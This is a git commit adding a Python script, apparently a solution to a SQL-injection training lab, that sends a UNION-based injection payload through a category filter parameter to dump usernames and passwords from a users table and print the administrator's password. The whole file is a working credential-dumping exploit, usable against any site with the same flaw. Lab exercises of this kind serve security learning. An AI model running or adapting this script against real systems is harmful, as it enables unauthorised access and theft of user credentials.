4152e0ba2f5f91b6164943bca317c413ed3a5d97
techno-sapi3n <tyler.ceja5@gmail.com>
2021-04-16 16:29:45 -0700

    init commit

---
+++ sqli/LAB-06/sqli-lab-06.py
@@ -0,0 +1,38 @@
+import requests
+import sys
+import urllib3
+from bs4 import BeautifulSoup
+import re
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies = {'http': 'http://127.0.01:8080', 'https': 'https://127.0.01:8080'}
+
+def exploit_sqli_users_table(url):
+    username = 'administrator'
+    path = '/filter?category=Gifts'
+    sql_payload = "' UNION select NULL, username||'**'|| password from users--"
+    r = requests.get(url+path+sql_payload, verify=False, proxies=proxies)
+    res = r.text
+    if 'administrator' in res:
+        print('[+] Found the administrator password...')
+        soup = BeautifulSoup(r.text, 'html.parser')
+        admin_password = soup.find(text=re.compile('.*administrator.*')).split('**')[1]
+        print(f'[+] The administrator password is {admin_password}')
+        return True
+    return False
+
+if __name__ == "__main__":
+    try:
+        print(sys.argv[1].strip())
+        print('**')
+        url = sys.argv[1].strip()
+    except IndexError:
+        print(f'[-] Usage: {sys.argv[0]} <url>')
+        print(f'[-] Example: {sys.argv[0]} www.example.com')
+        sys.exit(-1)
+    
+    print('[+] Dumping the list of usernames and passwords...')
+    if not exploit_sqli_users_table(url):
+        print('[-] Did not find an administrator password.')
+
+
